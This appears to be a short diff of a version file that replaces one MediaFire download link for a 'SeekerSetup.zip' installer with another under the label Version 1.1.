@@ -1,3 +1,3 @@
 Version 1.1
 
-https://www.mediafire.com/file/lzwmvyosikq8wlk/SeekerSetup.zip/file
+https://www.mediafire.com/file/ssh5ad24kyzz9tr/SeekerSetup.zip/file
